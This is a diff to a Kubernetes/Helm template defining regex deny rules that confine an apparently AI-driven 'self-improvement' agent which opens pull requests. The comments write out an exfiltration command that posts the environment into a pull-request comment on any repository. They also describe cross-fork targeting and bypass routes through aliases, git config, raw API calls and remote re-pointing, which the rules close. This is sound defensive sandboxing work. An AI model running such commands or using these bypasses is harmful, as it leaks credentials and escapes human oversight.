@@ -1484,7 +1484,35 @@ spec:
 #     `pull_requests: write`, which is enough to approve and merge its own --
 #     the one grant in this design that could turn a finding into a change
 #     nobody read. Creating is not blocked; merging, approving, closing and the
-#     release/secret/workflow surfaces are.
+#     release/secret/workflow surfaces are. `comment` is in that list for the
+#     reason the issue rule already gave for its own `comment`: it writes to a
+#     conversation this loop does not own. It was the cheapest exfiltration
+#     primitive in the set -- `gh pr comment --repo <anywhere> --body "$(env)"`
+#     is one call, and §6.4 is explicit that the credential is a classic token
+#     carrying `repo` on every repository the robot account can reach, so
+#     "anywhere" is not a figure of speech. The loop never comments; the two
+#     writes it makes are `create` and `edit --add-label`.
+#   - Which leaves the two spellings of that same primitive that survive a
+#     blocked `comment`.
+#     `gh-pr-edit-metadata-only` refuses `gh pr edit` carrying `--body`,
+#     `--body-file`, `--title` or `--base` (and their short forms). The loop
+#     runs exactly one shape of that command -- `gh pr edit <url> --add-label
+#     '<name>'`, one call per label, and the prompt at selfimprove_run.py says
+#     why -- so a body or a title on it is not the loop doing its job. Without
+#     the rule, an `edit --body` on a pull request in another repository is the
+#     `comment` primitive again with one more step.
+#     `gh-target-allowlist` is the other half: `-R`/`--repo` naming a
+#     repository that is neither the configured upstream nor the configured
+#     fork. `gh pr create --repo <attacker>/kube-agents --head <robot>:<branch>
+#     --body ...` is legal against any fork of the upstream, which is a set
+#     anybody can join by clicking Fork, so the fork network is not the
+#     constraint it looks like. The two allowed slugs are interpolated rather
+#     than hardcoded because both are install-configurable; they are the only
+#     Go template actions inside the policy block, and
+#     `test_selfimprove_policy.py` knows them by name and fails if a third
+#     appears. `-R` is matched attached as well as separated, because
+#     `-R<slug>` is how pflag also spells it and a rule that reads only
+#     `-R <slug>` is a rule with a documented bypass.
 #   - The same argument applied to `repo` and `issue`, which the allow-list
 #     admits and nothing then looked at the verb under. The list exists so the
 #     loop can confirm its fork and check for prior art -- both reads -- but a
@@ -1593,6 +1621,18 @@ spec:
 #     allow-list terminates on `(?![\w-])` rather than `\b`, because `\b` sits
 #     happily between `show` and the `-` of `show-ref` -- which would admit
 #     `checkout-index --prefix=/tmp -a` on the strength of `checkout`.
+{{- /*
+The two repository slugs `selfimprove.gh-target-allowlist` admits, escaped for
+use inside a regular expression inside a JSON string. `.` is the only character
+GitHub permits in an owner or a repository name that means something to a regex,
+so one `replace` covers it; the doubled backslash is the JSON escape, which
+decodes to the single one the pattern needs. They are the only two Go template
+actions inside the policy block, and `test_selfimprove_policy.py` substitutes
+them by name and fails on a third -- so a rule that grows another one has to
+teach the test about it rather than silently rendering `{{` into a pattern.
+*/ -}}
+{{- $upstreamRe := $upstreamRepo | replace "." "\\\\." }}
+{{- $forkRe := $si.github.forkRepo | replace "." "\\\\." }}
 apiVersion: v1
 kind: ConfigMap
 metadata:
@@ -1616,12 +1656,14 @@ data:
         {"id":"github.credential-replacement","pattern":"\\Agh\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+auth\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+(?:login|refresh|switch|logout)\\b"},
         {"id":"tool.self-modification","pattern":"\\Agcloud\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+components\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+(?:install|update|remove)\\b|\\Agh\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+extension\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+(?:install|upgrade|remove)\\b"},
         {"id":"selfimprove.no-cluster-tools","pattern":"\\A\\s*(?:kubectl|gcloud)\\b","message":"Command blocked: the self-improvement runner has no cluster or project write path. Use the read-only evidence CLI."},
-        {"id":"selfimprove.no-merge-or-approve","pattern":"\\Agh\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+pr\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+(?:merge|review|close|reopen|ready|lock|unlock)\\b|\\Agh\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+(?:release|secret|variable|workflow|ruleset)\\b","message":"Command blocked: the self-improvement runner opens pull requests and does nothing else to them. Merging, approving or closing one is a human's decision."},
+        {"id":"selfimprove.no-merge-or-approve","pattern":"\\Agh\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+pr\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+(?:merge|review|close|reopen|ready|lock|unlock)\\b|\\Agh\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+(?:release|secret|variable|workflow|ruleset)\\b|\\Agh\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+pr\\b(?:\\s+(?:-R|--repo)\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+|\\s+-(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])*)*\\s+comment\\b","message":"Command blocked: the self-improvement runner opens pull requests and does nothing else to them. Merging, approving or closing one is a human's decision, and a comment writes to a conversation this loop does not own."},
+        {"id":"selfimprove.gh-pr-edit-metadata-only","pattern":"\\Agh\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+pr\\b(?:\\s+(?:-R|--repo)\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+|\\s+-(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])*)*\\s+edit\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+(?:--(?:body|body-file|title|base)(?:=|\\s|$)|-[bft](?:$|[^-]))","message":"Command blocked: the self-improvement runner runs one shape of `gh pr edit` -- `--add-label`, one call per label, as the filing skill's sec. 7 lists it. `--body`, `--body-file`, `--title` and `--base` rewrite a pull request that is already open, which is a comment by another spelling."},
         {"id":"selfimprove.gh-repo-reads-only","pattern":"\\Agh\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+repo\\b(?!(?:\\s+-(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])*)*\\s+(?:view|list)(?=\\s|$))","message":"Command blocked: the self-improvement runner reads repository metadata to confirm its fork exists, and does nothing else to a repository. `gh repo view` and `gh repo list` are permitted; `delete`, `edit`, `archive`, `unarchive`, `rename`, `fork`, `sync`, `set-default` and `deploy-key` change the repository itself, which no finding requires."},
         {"id":"selfimprove.gh-issue-reads-only","pattern":"\\Agh\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+issue\\b(?!(?:\\s+-(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])*)*\\s+(?:view|list|status)(?=\\s|$))","message":"Command blocked: the self-improvement runner reads issues for the prior-art check the filing skill's sec. 0 requires, and files nothing there. `gh issue view`, `list` and `status` are permitted; `close`, `delete`, `edit`, `transfer`, `comment`, `pin` and `lock` write to a tracker this loop does not own."},
         {"id":"selfimprove.no-raw-api","pattern":"\\Agh\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+api\\b","message":"Command blocked: the self-improvement runner reaches GitHub through gh's own subcommands. A raw API call is a write path the argv rules cannot read, so it is refused whatever the method."},
         {"id":"selfimprove.no-gh-alias","pattern":"\\Agh\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+alias\\b","message":"Command blocked: gh expands aliases from its config before dispatch, so an alias is a way to spell a refused command that the argv rules never see. The runner has no use for one."},
         {"id":"selfimprove.unlisted-gh-subcommand","pattern":"\\Agh\\s+(?!-)(?!(?:pr|search|issue|repo|version|help)\\b)|\\Agh\\s+(?:-R|--repo)(?:\\s+|=)?(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+\\s+(?!(?:pr|search|issue|repo|version|help)\\b)","message":"Command blocked: the self-improvement runner uses gh for pull requests, search, issues and repository reads, and nothing else. A name outside that set is either a subcommand it has no business running or an alias, and an alias resolves to a command these rules have already read and refused."},
+        {"id":"selfimprove.gh-target-allowlist","pattern":"\\Agh\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+(?:-R(?![\\s=])|(?:-R|--repo)(?:=|\\s+)(?=\\S))(?!'?(?:{{ $upstreamRe }}|{{ $forkRe }})'?(?=\\s|$))","message":"Command blocked: the self-improvement loop reads and writes two repositories -- the upstream it files against and the fork it pushes branches to -- and `-R`/`--repo` naming a third points a credential that reaches every repository this account can see at one nobody configured. Drop the flag or name one of the two from your brief."},
         {"id":"selfimprove.no-git-config-injection","pattern":"\\Agit\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+config\\b|\\Agit\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+(?:-c|--config-env)(?:\\s+|=)'?(?![/~])[^'\"\\s=]*\\.[^'\"\\s=]*=","message":"Command blocked: git runs `alias.*`, `core.pager`, `core.hooksPath` and `credential.helper` as shell commands, so a config assignment is arbitrary execution wearing a flag. `git switch -c <branch>` is unaffected -- this reads only a dotted key with a value."},
         {"id":"selfimprove.git-push-fork-only","pattern":"\\Agit\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+push\\b(?!(?:\\s+-(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])*)*\\s+fork(?=\\s|$))|\\Agit\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+(?:send-pack|http-push)\\b","message":"Command blocked: the self-improvement loop pushes to the remote named `fork` and nowhere else. The runner creates that remote itself (selfimprove_run.py, _fetch_source_git) and the filing skill pushes `git push -u fork HEAD`; a push naming another remote, a URL, or no remote at all writes to a repository this loop does not own -- `origin` in upstream mode is the upstream repository."},
         {"id":"selfimprove.no-git-remote-repoint","pattern":"\\Agit\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+remote\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+(?:set-url|rename|remove|rm)\\b","message":"Command blocked: the rule above constrains pushes to the remote named `fork`, and re-pointing that name at another repository is how a name-based constraint gets spelled around. The runner only ever adds remotes to a tree it has just created; it never re-points or removes one."},
